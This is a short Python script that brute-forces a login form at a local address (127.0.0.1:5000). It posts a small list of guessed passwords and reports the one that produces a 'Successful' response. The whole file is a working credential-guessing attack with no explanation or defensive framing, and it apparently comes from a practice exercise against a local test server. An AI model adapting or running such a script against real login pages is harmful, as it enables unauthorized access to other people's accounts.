import requests
url="http://127.0.0.1:5000/login"
passowrds =['123','admin','123456','2e1klmelk21','secret123','213mjlkmndksa']
print('[+] Start Attack...')
for pwd in passowrds:
    response= requests.post(url,data={'password':pwd})
    if "Successful" in response.text:
        print(f'The password got found master: {pwd}')
        break
    else:
        print('[-] Faild')
print('[+] Attack finished')